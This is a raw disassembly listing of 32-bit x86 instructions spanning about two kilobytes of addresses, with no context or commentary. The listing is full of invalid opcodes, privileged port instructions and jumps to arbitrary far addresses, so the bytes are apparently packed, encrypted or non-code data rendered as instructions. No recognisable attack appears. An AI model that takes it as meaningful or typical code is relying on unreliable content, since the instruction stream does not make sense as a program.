  42042f:	clc    
  420430:	rcr    BYTE PTR [eax-0x496cb730],cl
  420436:	out    0xda,eax
  420438:	cmc    
  420439:	jo     0x4203f0
  42043b:	in     eax,0xbf
  42043d:	pop    ebx
  42043e:	dec    esp
  42043f:	sbb    esi,DWORD PTR ds:0x41ae936a
  420445:	push   es
  420446:	test   eax,0x7645642d
  42044b:	imul   ebp,ebx,0x7aff6334
  420451:	cmp    ebp,DWORD PTR [edx+0x2e9ca06e]
  420457:	sbb    edi,ebx
  420459:	stc    
  42045a:	cmp    BYTE PTR [ebx],cl
  42045c:	mov    WORD PTR [esi-0x77ac2eaf],ds
  420462:	stos   DWORD PTR es:[edi],eax
  420463:	or     BYTE PTR [eax],dh
  420465:	sub    al,0x9f
  420467:	mov    WORD PTR [edi+0x64],ss
  42046a:	sbb    ebp,DWORD PTR [eax-0x1250b71b]
  420470:	dec    esi
  420471:	aad    0x12
  420473:	imul   edi,esp,0x3d4a699
  420479:	mov    al,0xf8
  42047b:	call   0x7085ca54
  420480:	test   al,0xbc
  420482:	daa    
  420483:	je     0x420491
  420485:	call   FWORD PTR [eax-0x4d]
  420488:	loopne 0x420479
  42048a:	jns    0x4204bc
  42048c:	sub    DWORD PTR [edx+0x4f],ebp
  42048f:	test   ebp,esi
  420491:	jmp    0xf8be:0xd6369f2e
  420498:	lea    edi,[ebp-0x17104511]
  42049e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42049f:	jmp    0xb145b610
  4204a4:	add    DWORD PTR [eax+0x41],eax
  4204a7:	inc    esi
  4204a8:	ror    DWORD PTR [edi+0x17],cl
  4204ab:	idiv   bl
  4204ad:	imul   ebx,DWORD PTR [edi-0x5d857d7e],0x4550c517
  4204b7:	sahf   
  4204b8:	sub    al,0x15
  4204ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204bb:	mov    ds:0x83297f93,eax
  4204c0:	adc    eax,0x90631d67
  4204c5:	jns    0x4204c6
  4204c7:	cmp    DWORD PTR [edi],0x2ec7ba8a
  4204cd:	sub    ch,BYTE PTR ds:0x4939f87e
  4204d3:	xor    eax,edx
  4204d5:	out    0xf8,eax
  4204d7:	and    al,0x7e
  4204d9:	popf   
  4204da:	push   ss
  4204db:	xor    eax,0x66f84f17
  4204e0:	mov    esi,0x1225fa56
  4204e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204e6:	or     esi,eax
  4204e8:	inc    esp
  4204e9:	je     0x42052b
  4204eb:	sub    edi,eax
  4204ed:	sbb    ah,ah
  4204ef:	mov    ch,0xd1
  4204f1:	test   BYTE PTR [ebx-0x20a09d71],ah
  4204f7:	push   es
  4204f8:	div    DWORD PTR [esi-0x4c]
  4204fb:	repnz int3 
  4204fd:	jne    0x4204d1
  4204ff:	jo     0x420522
  420501:	mov    dl,dl
  420503:	sahf   
  420504:	jecxz  0x42049d
  420506:	mov    bh,ch
  420508:	fmul   st(6),st
  42050a:	aas    
  42050b:	outs   dx,DWORD PTR ds:[esi]
  42050c:	cmp    BYTE PTR [esi],dh
  42050e:	test   DWORD PTR ds:0xde830856,esi
  420514:	pcmpeqd mm2,QWORD PTR ds:0xac240a0b
  42051b:	sbb    DWORD PTR [ebx*2-0x296bf41],ebx
  420522:	xchg   edx,eax
  420523:	push   cs
  420524:	ds mov ebx,0xd9e18fad
  42052a:	pop    ss
  42052b:	in     al,dx
  42052c:	arpl   WORD PTR [esi-0x1e],di
  42052f:	pop    edi
  420530:	imul   ebp,esi,0xf252240b
  420536:	and    esi,DWORD PTR [ecx-0x6ae05170]
  42053c:	push   esi
  42053d:	inc    ebx
  42053e:	xchg   DWORD PTR [ecx],ecx
  420540:	cwde   
  420541:	loopne 0x420547
  420543:	(bad)  
  420545:	jne    0x4204f7
  420547:	jne    0x4205b4
  420549:	inc    esp
  42054a:	dec    edi
  42054b:	mov    eax,ds:0xe736c9b
  420550:	repz ret 
  420552:	cmp    DWORD PTR [ecx+0x40],ecx
  420555:	in     al,dx
  420556:	imul   ebx,DWORD PTR [esi+ebx*4],0x91dd803
  42055d:	js     0x42054f
  42055f:	ret    0x3008
  420562:	sub    eax,DWORD PTR [edx]
  420564:	pop    ds
  420565:	daa    
  420566:	and    eax,0x44
  420569:	jmp    0xb33add7
  42056e:	imul   ebx,DWORD PTR [edx-0x2b],0x2b59804c
  420575:	mov    bh,0x6a
  420577:	xchg   ecx,eax
  420578:	push   edx
  420579:	(bad)  
  42057a:	iret   
  42057b:	cld    
  42057c:	mov    ebp,0xb52e6a8b
  420581:	mov    al,ds:0xabd5e610
  420586:	rcl    BYTE PTR [esi-0x48],cl
  420589:	sbb    eax,0x3a48585e
  42058e:	std    
  42058f:	data16 jns 0x4205ff
  420592:	ret    
  420593:	add    eax,0x427ccbd2
  420598:	out    dx,al
  420599:	test   BYTE PTR [ecx+0x36dd4c28],0x23
  4205a0:	lahf   
  4205a1:	jb     0x4205fd
  4205a3:	popf   
  4205a4:	lods   eax,DWORD PTR ds:[esi]
  4205a6:	and    eax,0x50bcdb39
  4205ab:	mov    ebx,0x8c0d70ea
  4205b0:	and    BYTE PTR [edi],0xd8
  4205b3:	arpl   WORD PTR [esi],sp
  4205b5:	add    esi,DWORD PTR [bp+di]
  4205b8:	mov    ebp,0x8337704c
  4205bd:	(bad)  [eax+0x23]
  4205c0:	sub    DWORD PTR [ebp-0x5d],ebp
  4205c3:	cmp    DWORD PTR [edx],ebx
  4205c5:	lock mov ah,bl
  4205c8:	cmp    al,0x10
  4205ca:	jno    0x420585
  4205cc:	(bad)  
  4205cd:	outs   dx,DWORD PTR ds:[esi]
  4205ce:	jg     0x4205e2
  4205d0:	dec    edx
  4205d1:	jmp    0x47b546a4
  4205d6:	in     al,dx
  4205d7:	mov    dl,0xb
  4205d9:	push   eax
  4205da:	(bad)  
  4205db:	jmp    FWORD PTR [eax+0x55dbb4e0]
  4205e1:	mov    al,0x49
  4205e3:	(bad)  
  4205e4:	in     al,0x68
  4205e6:	jno    0x42060f
  4205e8:	jnp    0x4205dd
  4205ea:	ret    
  4205eb:	loopne 0x42066a
  4205ed:	mov    ch,0x7c
  4205ef:	ror    BYTE PTR [eax],0xbc
  4205f2:	and    eax,0xb33efa56
  4205f7:	jmp    0xc70e26c7
  4205fc:	and    eax,0x835a0006
  420601:	out    dx,al
  420602:	add    al,0xdd
  420604:	dec    ebp
  420605:	cld    
  420606:	stc    
  420607:	fwait
  420608:	int    0x12
  42060a:	hlt    
  42060b:	aaa    
  42060c:	cmp    eax,0xb5a271c0
  420611:	adc    ah,BYTE PTR [esi]
  420613:	xchg   ebp,eax
  420614:	sbb    ch,al
  420616:	inc    ebp
  420617:	xor    eax,0x40744fa2
  42061c:	retf   0x8422
  42061f:	fiadd  DWORD PTR [edx]
  420621:	adc    cl,BYTE PTR [ebx-0x1b]
  420624:	pop    edx
  420625:	cs cli 
  420627:	cmp    eax,0xd22ab8f4
  42062c:	mov    BYTE PTR [edx],dh
  42062e:	add    esi,DWORD PTR [ecx-0x3c01f849]
  420634:	dec    esi
  420635:	fist   WORD PTR [eax+0x24a92314]
  42063b:	out    dx,eax
  42063c:	mov    ebp,0x8396d0cb
  420641:	jmp    0x12cd2364
  420646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420648:	jo     0x420648
  42064a:	sbb    DWORD PTR [esi+edx*8-0x3d380b8c],0xd88de694
  420655:	gs dec edx
  420657:	xlat   BYTE PTR ds:[ebx]
  420658:	jg     0x420666
  42065a:	cmp    DWORD PTR [esi-0x24ebe299],edx
  420660:	jbe    0x4206ce
  420662:	pop    ds
  420663:	jmp    0x420631
  420665:	hlt    
  420666:	and    ebx,DWORD PTR [ebx-0x17]
  420669:	fdiv   st(4),st
  42066b:	stos   DWORD PTR es:[edi],eax
  42066c:	rcr    DWORD PTR [ebx-0x4f],cl
  42066f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420670:	inc    edx
  420671:	and    BYTE PTR [ebx],cl
  420673:	(bad)  
  420674:	cmp    al,0x7
  420676:	or     BYTE PTR [esi],bh
  420678:	mov    esi,0x5a3876a8
  42067d:	ja     0x420684
  42067f:	mov    cs,WORD PTR [edi+0x33c30d15]
  420685:	inc    esp
  420686:	push   ds
  420687:	lods   eax,DWORD PTR ds:[esi]
  420688:	xchg   ecx,eax
  420689:	test   al,0x13
  42068b:	hlt    
  42068c:	push   eax
  42068d:	retf   
  42068e:	mov    edi,DWORD PTR [eax-0x7a61174c]
  420694:	pop    ebp
  420695:	pop    ss
  420696:	xor    ah,dl
  420698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420699:	(bad)  
  42069b:	sub    cl,BYTE PTR [esi]
  42069d:	ja     0x420686
  42069f:	test   al,0xbc
  4206a1:	adc    bh,BYTE PTR [edi+0x70]
  4206a4:	es nop
  4206a6:	add    DWORD PTR [eax-0x562eca1],esi
  4206ac:	and    ebp,DWORD PTR [edx-0x11dbe3dc]
  4206b2:	mov    ds:0x49b6a8e9,al
  4206b7:	aad    0x2d
  4206b9:	iret   
  4206ba:	sbb    ecx,esp
  4206bc:	lods   al,BYTE PTR ds:[esi]
  4206bd:	neg    al
  4206bf:	daa    
  4206c0:	xchg   ebx,eax
  4206c1:	dec    edx
  4206c2:	pop    ss
  4206c3:	pop    ds
  4206c4:	jecxz  0x4206fb
  4206c6:	mov    eax,0xda0301d1
  4206cb:	(bad)  
  4206cc:	xor    esp,ecx
  4206ce:	push   cs
  4206cf:	scas   al,BYTE PTR es:[edi]
  4206d0:	dec    ecx
  4206d1:	push   es
  4206d2:	jge    0x4206a8
  4206d4:	pushf  
  4206d5:	imul   ecx,DWORD PTR [edi+0x30e77075],0x20
  4206dc:	popf   
  4206dd:	(bad)  
  4206de:	in     eax,dx
  4206df:	daa    
  4206e0:	mov    edi,0xc8912296
  4206e5:	popf   
  4206e6:	or     edx,0x69
  4206e9:	(bad)  
  4206ea:	sub    cl,BYTE PTR [esi]
  4206ec:	jge    0x420693
  4206ee:	xlat   BYTE PTR ds:[ebx]
  4206ef:	and    al,0xe3
  4206f1:	push   ecx
  4206f2:	mov    dh,0xee
  4206f4:	pushf  
  4206f5:	mov    ecx,0x20105cf6
  4206fa:	mov    ebp,DWORD PTR [eax+0x1d2c62bc]
  420700:	mov    al,ds:0x2ba7d9a
  420705:	enter  0xdc52,0x1c
  420709:	daa    
  42070a:	out    0x6a,al
  42070c:	(bad)  
  42070d:	xor    DWORD PTR fs:[ebp-0x5675d956],0x1a0bb9de
  420718:	cmp    ebx,eax
  42071a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42071b:	adc    DWORD PTR [ecx+0x4b],esi
  42071e:	(bad)  
  420720:	push   ebx
  420721:	into   
  420722:	lahf   
  420723:	mov    edi,0x9a14dd6b
  420728:	push   edi
  420729:	xlat   BYTE PTR ds:[bx]
  42072b:	inc    edx
  42072c:	jge    0x420767
  42072e:	retf   0xd066
  420731:	xchg   edi,eax
  420732:	pop    esi
  420733:	and    al,0xcc
  420735:	fsubr  DWORD PTR [eax]
  420737:	cs mov ah,0x3c
  42073a:	outs   dx,DWORD PTR ds:[esi]
  42073b:	fmul   st,st(7)
  42073d:	cmp    esp,edi
  42073f:	loope  0x420782
  420741:	mov    cl,0x66
  420743:	cmp    eax,0x9f623023
  420748:	jbe    0x42079e
  42074a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42074b:	lds    ecx,FWORD PTR [eax+0x196a40f7]
  420751:	pop    ecx
  420752:	push   es
  420753:	retf   
  420754:	mov    DWORD PTR [ebp+0x53],esp
  420757:	push   ss
  420758:	ret    
  420759:	rcl    BYTE PTR [ecx-0x56],1
  42075c:	sbb    DWORD PTR [ebp-0x2e],esp
  42075f:	inc    edx
  420760:	push   esp
  420761:	outs   dx,DWORD PTR ds:[esi]
  420762:	sbb    BYTE PTR [edi+0x48],cl
  420765:	es scas al,BYTE PTR es:[edi]
  420767:	mov    ebp,0x1ab623b8
  42076c:	adc    dh,BYTE PTR [ebx]
  42076e:	test   eax,0x906bb4dc
  420773:	adc    BYTE PTR ds:0x3dced2f7,bh
  420779:	mov    ebx,0x55141e7b
  42077e:	test   eax,0x4c65faf3
  420783:	mov    ds:0xdc02cbfe,eax
  420788:	es pop ds
  42078a:	xchg   esp,eax
  42078b:	ss jmp 0x4207a2
  42078e:	pop    ds
  42078f:	test   BYTE PTR [esi-0x48],ah
  420792:	pusha  
  420793:	daa    
  420794:	rol    BYTE PTR [eax+0x64a34d27],cl
  42079a:	in     al,dx
  42079b:	arpl   WORD PTR [ebp-0x23],dx
  42079e:	dec    esi
  42079f:	sti    
  4207a0:	ret    
  4207a1:	mov    ds:0x2065a890,al
  4207a6:	aam    0xb4
  4207a8:	jp     0x420749
  4207aa:	jb     0x42081c
  4207ac:	pop    ecx
  4207ad:	xchg   BYTE PTR [edx],bl
  4207af:	pop    es
  4207b0:	push   cs
  4207b1:	das    
  4207b2:	lods   al,BYTE PTR ds:[esi]
  4207b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207b4:	inc    ebp
  4207b5:	add    eax,0xb2c4a6b4
  4207ba:	stos   DWORD PTR es:[edi],eax
  4207bb:	mov    ds:0x8a15f365,eax
  4207c0:	fyl2x  
  4207c2:	fsub   QWORD PTR [eax]
  4207c4:	retf   
  4207c5:	jle    0x420801
  4207c7:	pop    ebx
  4207c8:	xchg   DWORD PTR [ecx+eiz*1+0x23ce5d9],ebp
  4207cf:	shl    BYTE PTR [edx],cl
  4207d1:	push   edx
  4207d2:	(bad)  
  4207d3:	lahf   
  4207d4:	mov    ecx,0x40f9da41
  4207d9:	je     0x42081f
  4207db:	out    0x26,eax
  4207dd:	pop    es
  4207de:	shr    DWORD PTR [ebp+0x66],cl
  4207e1:	xchg   esp,eax
  4207e2:	dec    edi
  4207e3:	lods   eax,DWORD PTR ds:[esi]
  4207e4:	mov    cl,0x72
  4207e6:	fstp   TBYTE PTR [ecx-0x68]
  4207e9:	sbb    eax,0x1f16a1dd
  4207ee:	sti    
  4207ef:	xor    eax,0xf6b1f222
  4207f4:	repz in eax,dx
  4207f6:	cld    
  4207f7:	adc    eax,0x2ca6f73b
  4207fc:	cmp    BYTE PTR [edi],0xde
  4207ff:	mov    dh,0x9c
  420801:	fadd   st,st(4)
  420803:	imul   ebp,DWORD PTR [ecx],0x5b
  420806:	mov    dl,0xbb
  420808:	push   edi
  420809:	mov    esi,0xa3ea5a06
  42080e:	iret   
  42080f:	imul   BYTE PTR [esi-0x2e]
  420812:	dec    ecx
  420813:	push   ecx
  420814:	or     al,BYTE PTR [ecx+0x58]
  420817:	inc    edx
  420818:	add    eax,0xd9c86b37
  42081d:	(bad)  
  42081e:	cmp    al,0x88
  420820:	ficom  DWORD PTR [ecx]
  420822:	pop    ss
  420823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420824:	pop    edx
  420825:	mov    ecx,0x99a0f8d8
  42082a:	fiadd  WORD PTR [esi+0x1edb8534]
  420830:	mov    ebp,0xd2c0714a
  420835:	pop    edx
  420836:	ffreep st(0)
  420838:	mov    DWORD PTR [ecx+ecx*1-0x10],ecx
  42083c:	fwait
  42083d:	aad    0xe1
  42083f:	jnp    0x42087c
  420841:	mov    bh,dh
  420843:	ja     0x4207d9
  420845:	sub    ecx,DWORD PTR fs:[edx-0x57]
  420849:	push   esi
  42084a:	pop    esi
  42084b:	lock push eax
  42084d:	sbb    DWORD PTR [eax-0x742cf0e5],ebx
  420853:	inc    edi
  420854:	inc    esi
  420855:	sbb    eax,0x57e398a6
  42085a:	push   eax
  42085b:	aad    0x66
  42085d:	dec    esi
  42085e:	pop    ebp
  42085f:	or     DWORD PTR [ecx-0x38],ecx
  420862:	pusha  
  420863:	adc    DWORD PTR [ecx-0x45],edi
  420866:	and    eax,0x647f1c6f
  42086b:	push   es
  42086c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42086d:	popf   
  42086e:	push   edx
  42086f:	push   ebx
  420870:	es and eax,0xccdd22e2
  420876:	ror    DWORD PTR [ebp+0x2f],cl
  420879:	or     dh,BYTE PTR ds:0x17b8b878
  42087f:	into   
  420880:	push   ebp
  420881:	lods   al,BYTE PTR ds:[esi]
  420882:	gs fwait
  420884:	out    0x4f,eax
  420886:	(bad)  
  420887:	fs ds popf 
  42088a:	dec    ebx
  42088b:	push   0x1758c4f
  420890:	dec    ebp
  420891:	ds aas 
  420893:	xchg   ebp,eax
  420894:	cmp    DWORD PTR [ebx+edi*1+0x31],eax
  420898:	mov    ecx,0xa2764b17
  42089d:	fcmovne st,st(4)
  42089f:	scas   al,BYTE PTR es:[edi]
  4208a0:	cmc    
  4208a1:	lock fs push edx
  4208a4:	cmp    al,0x7f
  4208a6:	cmovnp edi,DWORD PTR [edi]
  4208a9:	fist   DWORD PTR [edx+0x25]
  4208ac:	(bad)  
  4208ad:	loop   0x4208ad
  4208af:	jecxz  0x420927
  4208b1:	mov    dl,0x5e
  4208b3:	sbb    al,0x87
  4208b5:	mul    BYTE PTR [esi+0x1f938e63]
  4208bb:	stos   DWORD PTR es:[edi],eax
  4208bc:	lock repz xchg edi,eax
  4208bf:	pushf  
  4208c0:	xchg   ebx,eax
  4208c1:	in     eax,0xe5
  4208c3:	and    BYTE PTR [edx+0x41],dh
  4208c6:	jmp    0x1210:0x7a49590a
  4208cd:	xor    al,BYTE PTR [edi+edi*2]
  4208d0:	std    
  4208d1:	jge    0x420862
  4208d3:	mov    dl,0xff
  4208d5:	lods   al,BYTE PTR ds:[esi]
  4208d6:	sub    al,0x4a
  4208d8:	mov    dl,0x49
  4208da:	xchg   ecx,eax
  4208db:	int    0x88
  4208dd:	out    dx,al
  4208de:	dec    ebx
  4208df:	adc    ch,al
  4208e1:	fidivr DWORD PTR [esi-0x31]
  4208e4:	mov    ch,0xc7
  4208e6:	adc    al,0x65
  4208e8:	in     al,dx
  4208e9:	sahf   
  4208ea:	cmc    
  4208eb:	rol    BYTE PTR fs:[eax+0x76],1
  4208ef:	stos   BYTE PTR es:[edi],al
  4208f0:	adc    ch,ah
  4208f2:	fisub  WORD PTR [ecx-0x1d6428a0]
  4208f8:	es stc 
  4208fa:	imul   ebx,DWORD PTR [edx+0x87a02f7],0xc69c54db
  420904:	cdq    
  420905:	neg    DWORD PTR [edi+0x386e6eb]
  42090b:	sbb    dh,BYTE PTR [esi+0x59263a5a]
  420911:	add    ecx,DWORD PTR [edi]
  420913:	test   eax,0x82090c27
  420918:	aas    
  420919:	mov    edi,0x4488353f
  42091e:	out    0x52,al
  420920:	test   DWORD PTR [eax+edi*1+0x43],edx
  420924:	inc    esi
  420925:	xchg   dl,dl
  420927:	cld    
  420928:	(bad)  [ebp+0x5]
  42092b:	lock add al,0xcd
  42092e:	xchg   edi,eax
  42092f:	mov    cl,0xe2
  420931:	mov    ebp,0xd2ce38af
  420936:	pop    ebp
  420937:	in     al,0x91
  420939:	push   eax
  42093a:	dec    ecx
  42093b:	jae    0x420921
  42093d:	call   0x7cf8153c
  420942:	cmc    
  420943:	push   ebx
  420944:	test   eax,0x703781c0
  420949:	mov    ds:0x7164b99b,eax
  42094e:	xor    eax,0xcff0a293
  420953:	xor    bh,0x2e
  420956:	stc    
  420957:	pop    ebp
  420958:	(bad)  
  42095a:	inc    esi
  42095b:	scas   eax,DWORD PTR es:[edi]
  42095c:	jne    0x420965
  42095e:	fdiv   st,st(7)
  420960:	jmp    0x4209ab
  420962:	(bad)  
  420963:	or     DWORD PTR [edx+0x4b1b1be3],ecx
  420969:	adc    esi,DWORD PTR [ecx]
  42096b:	into   
  42096c:	stos   BYTE PTR es:[edi],al
  42096d:	sti    
  42096e:	inc    edi
  42096f:	jle    0x4209c3
  420971:	or     eax,0xdabd42bf
  420976:	push   ebp
  420977:	pusha  
  420978:	inc    edi
  420979:	and    ebx,DWORD PTR [edx+eiz*1-0xe1311bf]
  420980:	pusha  
  420981:	or     ebp,DWORD PTR [eax]
  420983:	xchg   ebx,eax
  420984:	adc    eax,0x108c605b
  420989:	jmp    0xcf186239
  42098e:	stc    
  42098f:	pop    es
  420990:	outs   dx,BYTE PTR ds:[esi]
  420991:	sub    eax,0xb97cbbc9
  420996:	inc    ebp
  420997:	cs (bad) 
  420999:	sar    BYTE PTR [ebp+ecx*4+0x7785c4a3],0x97
  4209a1:	int    0x5
  4209a3:	inc    edi
  4209a4:	push   0xffffff85
  4209a6:	jl     0x420a22
  4209a8:	jnp    0x420989
  4209aa:	mov    BYTE PTR [edx],cl
  4209ac:	jne    0x4209b1
  4209ae:	lahf   
  4209af:	lahf   
  4209b0:	call   0xef85:0x16e6c121
  4209b7:	or     BYTE PTR [ecx],ah
  4209b9:	shl    DWORD PTR [ecx],1
  4209bb:	jle    0x4209e3
  4209bd:	sbb    eax,0x3e637f33
  4209c2:	inc    ebx
  4209c3:	mov    al,0x9d
  4209c5:	and    edi,eax
  4209c7:	outs   dx,DWORD PTR ds:[esi]
  4209c8:	stc    
  4209c9:	aad    0xbf
  4209cb:	sti    
  4209cc:	pop    ss
  4209cd:	mov    cl,0x2a
  4209cf:	and    ch,BYTE PTR ds:0x441f87c4
  4209d5:	or     al,0xdc
  4209d7:	inc    esp
  4209d8:	sbb    eax,esp
  4209da:	xlat   BYTE PTR ds:[ebx]
  4209db:	cmp    DWORD PTR [esi],esi
  4209dd:	cmc    
  4209de:	xchg   ebp,eax
  4209df:	lock cwde 
  4209e1:	adc    BYTE PTR [ecx-0xccc623f],bh
  4209e7:	ds jae 0x4209e2
  4209ea:	mov    ebx,?
  4209ec:	cmp    BYTE PTR [ebp+0x1f],dl
  4209ef:	arpl   WORD PTR [esi+0xbfc3208],dx
  4209f5:	into   
  4209f6:	push   cs
  4209f7:	(bad)  
  4209f8:	xor    ah,ch
  4209fa:	pop    esi
  4209fb:	or     al,0x9d
  4209fd:	inc    ebp
  4209fe:	pop    ebp
  4209ff:	lods   eax,DWORD PTR ds:[esi]
  420a00:	or     eax,0x8c52935a
  420a05:	and    ecx,esi
  420a07:	pop    ds
  420a08:	dec    eax
  420a09:	pop    ecx
  420a0a:	mov    bl,0xbf
  420a0c:	pop    edx
  420a0d:	and    dl,BYTE PTR [edi-0x799bce50]
  420a13:	add    DWORD PTR [edx+ebp*2-0x47],edi
  420a17:	add    eax,0xec2cfd6a
  420a1c:	and    dl,BYTE PTR [ebp-0x1d]
  420a1f:	dec    ebx
  420a20:	add    al,0xaf
  420a22:	jbe    0x420a40
  420a24:	retf   0x7c66
  420a27:	(bad)  
  420a28:	or     esp,edi
  420a2a:	push   0x55
  420a2c:	iret   
  420a2d:	push   ebx
  420a2e:	scas   al,BYTE PTR es:[edi]
  420a2f:	mov    eax,?
  420a31:	sbb    BYTE PTR [ebx+0x161ca6e9],dl
  420a37:	jmp    0x4209e5
  420a39:	mov    dl,0xef
  420a3b:	addr16 jno 0x420a1f
  420a3e:	mov    ebp,0x9962903c
  420a43:	and    al,0xf3
  420a45:	sahf   
  420a46:	jmp    0x3dbc7d90
  420a4b:	std    
  420a4c:	retf   
  420a4d:	adc    bh,BYTE PTR [esi+0x76]
  420a50:	mov    ebx,0x8c5d7ad2
  420a55:	arpl   WORD PTR [ecx+0x27],bx
  420a58:	dec    edx
  420a59:	cmp    ebx,DWORD PTR [edi]
  420a5b:	jge    0x420a8a
  420a5d:	scas   al,BYTE PTR es:[edi]
  420a5e:	scas   al,BYTE PTR es:[edi]
  420a5f:	out    dx,al
  420a60:	lods   eax,DWORD PTR ds:[esi]
  420a61:	aaa    
  420a62:	stos   DWORD PTR es:[edi],eax
  420a63:	cmc    
  420a64:	mov    BYTE PTR [ecx-0x3926f809],bl
  420a6a:	popf   
  420a6b:	xchg   ebp,eax
  420a6c:	mov    WORD PTR [esi+0x19],ds
  420a6f:	dec    esp
  420a70:	pop    ecx
  420a71:	adc    al,0x8b
  420a73:	fistp  WORD PTR [ecx]
  420a75:	daa    
  420a76:	inc    esp
  420a77:	mov    dl,BYTE PTR [eax+eax*1+0x2e]
  420a7b:	out    dx,eax
  420a7c:	mov    ebp,0x686cb34a
  420a81:	stc    
  420a82:	int3   
  420a83:	hlt    
  420a84:	push   esp
  420a85:	jmp    0xeaf3:0x3594a7bc
  420a8c:	call   0x4d5e9ea2
  420a91:	shl    dl,1
  420a93:	jcxz   0x420a70
  420a96:	jl     0x420afe
  420a98:	mov    ebx,0x1a9283a9
  420a9d:	mov    WORD PTR [esi],fs
  420a9f:	out    0xe1,al
  420aa1:	rol    DWORD PTR [ebx+0x53],0xc6
  420aa5:	ins    BYTE PTR es:[edi],dx
  420aa6:	pop    eax
  420aa7:	ins    DWORD PTR es:[edi],dx
  420aa8:	cmp    BYTE PTR [edx-0x5d],0x9a
  420aac:	pop    es
  420aad:	ds dec edx
  420aaf:	clc    
  420ab0:	sbb    eax,0xa54997c4
  420ab5:	sbb    BYTE PTR [eax+eiz*4+0x2169c9f],dh
  420abc:	aas    
  420abd:	test   al,0x4f
  420abf:	stc    
  420ac0:	mov    bl,bl
  420ac2:	and    esi,0xe6e5dddb
  420ac8:	push   DWORD PTR [edx+0x1d]
  420acb:	aas    
  420acc:	cmp    ah,BYTE PTR [esi+0x56b7948a]
  420ad2:	std    
  420ad3:	mov    ecx,0xb3820a39
  420ad8:	jl     0x420a7e
  420ada:	ins    BYTE PTR es:[edi],dx
  420adb:	pop    esp
  420adc:	jb     0x420a8f
  420ade:	push   ebp
  420adf:	je     0x420b2e
  420ae1:	das    
  420ae2:	(bad)  
  420ae3:	cld    
  420ae4:	(bad)  
  420ae5:	call   FWORD PTR [ecx-0x3a5adc95]
  420aeb:	(bad)  
  420aec:	inc    ecx
  420aed:	add    BYTE PTR es:[esi],ch
  420af0:	mov    edi,DWORD PTR [edx-0xc92ae05]
  420af6:	mov    bl,0x6d
  420af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420af9:	test   DWORD PTR [eax],esp
  420afb:	inc    edx
  420afc:	in     eax,dx
  420afd:	clc    
  420afe:	and    eax,0xf2cbf624
  420b03:	scas   al,BYTE PTR es:[edi]
  420b04:	cdq    
  420b05:	mov    dh,0x43
  420b07:	inc    esi
  420b08:	mov    ch,0x84
  420b0a:	xchg   esp,eax
  420b0b:	out    0x25,al
  420b0d:	std    
  420b0e:	mov    ch,0x33
  420b10:	sbb    esp,edx
  420b12:	ficomp WORD PTR [edi-0x5f]
  420b15:	sti    
  420b16:	clc    
  420b17:	adc    DWORD PTR [edi+ebp*2+0x74284cb0],ecx
  420b1e:	call   0xeac26515
  420b23:	ret    0x8257
  420b26:	scas   al,BYTE PTR es:[edi]
  420b27:	dec    esi
  420b28:	push   edi
  420b29:	sahf   
  420b2a:	leave  
  420b2b:	rol    BYTE PTR [ebx-0x38],cl
  420b2e:	outs   dx,BYTE PTR ds:[esi]
  420b2f:	sbb    eax,0xba2777ad
  420b34:	xor    ebx,DWORD PTR [ebx+0x47]
  420b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b38:	(bad)  
  420b39:	mov    ecx,0x221c1e9d
  420b3e:	sub    ecx,DWORD PTR [ebx-0x70cecbb3]
  420b44:	pop    ebp
  420b45:	sbb    eax,ecx
  420b47:	xor    ebx,DWORD PTR [edx-0x5b]
  420b4a:	dec    ebp
  420b4b:	sbb    ebx,0x778ad2a2
  420b51:	je     0x420bad
  420b53:	cmp    ch,dl
  420b55:	sub    DWORD PTR [ecx+0x23d89c05],esi
  420b5b:	bound  esi,QWORD PTR [ebp-0x75]
  420b5e:	mov    dh,0x29
  420b60:	jmp    0x39e49860
  420b65:	fs test BYTE PTR ds:0x3041fcc3,0x87
  420b6e:	cmp    BYTE PTR [ecx],0x51
  420b71:	mov    ah,0xa3
  420b73:	pushf  
  420b74:	nop
  420b75:	lahf   
  420b76:	std    
  420b77:	jge    0x420b0d
  420b79:	ror    DWORD PTR [eax],1
  420b7b:	inc    ebp
  420b7c:	out    dx,al
  420b7d:	mov    ?,WORD PTR [ebx-0xa7c06e]
  420b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b84:	pushf  
  420b85:	in     eax,0xaf
  420b87:	in     eax,dx
  420b88:	sbb    DWORD PTR [ebx+0x49],0x7f
  420b8c:	sub    ecx,ebx
  420b8e:	fstp   QWORD PTR [edi]
  420b90:	dec    esp
  420b91:	scas   al,BYTE PTR es:[edi]
  420b92:	jl     0x420b66
  420b94:	push   esp
  420b95:	call   0x4525:0x5ebbd128
  420b9c:	stc    
  420b9d:	fiadd  DWORD PTR [ebp+0x9962c76]
  420ba3:	cmp    al,0x63
  420ba5:	dec    ecx
  420ba6:	bound  ebx,QWORD PTR [eax-0x4dc8e3a]
  420bac:	mov    BYTE PTR [edi+0x78ac241f],dh
  420bb2:	jmp    0x19e8:0x39cb6e63
  420bb9:	ret    0xc160
  420bbc:	xchg   edi,eax
  420bbd:	cmp    BYTE PTR [ebx+0x6d43299a],0xea
  420bc4:	mov    ecx,0xa2bba48f
  420bc9:	pop    ebp
  420bca:	popf   
  420bcb:	or     al,0xf7
  420bcd:	xor    DWORD PTR [eax+0x40],ebx
  420bd0:	jg     0x420b73
  420bd2:	jns    0x420bfd
  420bd4:	jge    0x420bff
  420bd6:	jmp    0x79a6:0x83793402
  420bdd:	enter  0xc26e,0x90
  420be1:	ins    BYTE PTR es:[edi],dx
  420be2:	mov    esi,0xe13c130a
  420be7:	mov    ch,0x85
  420be9:	ret    0x715e
  420bec:	cmp    bl,0x71
  420bef:	in     eax,0xf2
  420bf1:	cmp    BYTE PTR [ebp+0x2b32b0ba],ah
  420bf7:	scas   al,BYTE PTR es:[edi]
